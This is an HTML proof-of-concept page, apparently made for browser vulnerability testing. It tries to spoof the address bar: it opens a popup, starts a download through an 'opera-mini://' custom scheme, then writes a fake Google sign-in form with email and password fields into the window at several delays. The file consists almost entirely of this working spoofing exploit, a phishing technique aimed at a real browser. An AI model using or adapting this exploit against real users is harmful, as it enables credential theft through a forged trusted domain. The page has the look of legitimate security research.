<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TC-A: Download Freeze</title></head>
<body>
<h3>TC-A: Custom scheme + download freeze</h3>
<label>Fake domain shown to victim:</label>
<input id="fake" value="https://accounts.google.com" style="width:400px"><br><br>
<label>Download trigger URL (attacker):</label>
<input id="dl" value="https://example.com/file.apk" style="width:400px"><br><br>
<button onclick="run()">Run TC-A</button>
<pre id="log"></pre>
<script>
const log = m => document.getElementById('log').textContent += m + "\n";

async function run() {
  const fake = document.getElementById('fake').value;
  const dl   = document.getElementById('dl').value;

  // 1. buka window kosong dari origin ini
  const w = window.open("about:blank", "_blank");
  if (!w) { log("popup blocked"); return; }

  // 2. picu download lewat custom scheme (freeze kandidat)
  w.location.href = `opera-mini://open?url=${encodeURIComponent(dl)}`;

  // 3. tunggu download mulai, lalu tulis konten palsu
  //    variasikan delay: 0, 50, 150, 300, 500 ms
  for (const d of [0, 50, 150, 300, 500]) {
    await new Promise(r => setTimeout(r, d));
    try {
      w.document.open();
      w.document.write(`<!doctype html><html><head><title>${fake}</title></head>
        <body style="font-family:sans-serif;text-align:center;padding-top:60px">
        <h2>Sign in</h2>
        <p>delay=${d}ms</p>
        <input placeholder="email"><br><br>
        <input type="password" placeholder="password"><br><br>
        <button onclick="alert('leaked')">Next</button>
        </body></html>`);
      w.document.close();
      w.stop();
      log(`wrote at ${d}ms — CEK ADDRESS BAR SEKARANG`);
    } catch (e) {
      log(`SOP block at ${d}ms: ${e.message}`);
    }
  }
  log("TC-A done. Catat: apakah address bar menampilkan about:blank / domain attacker / fake?");
}
</script>
</body>
</html>
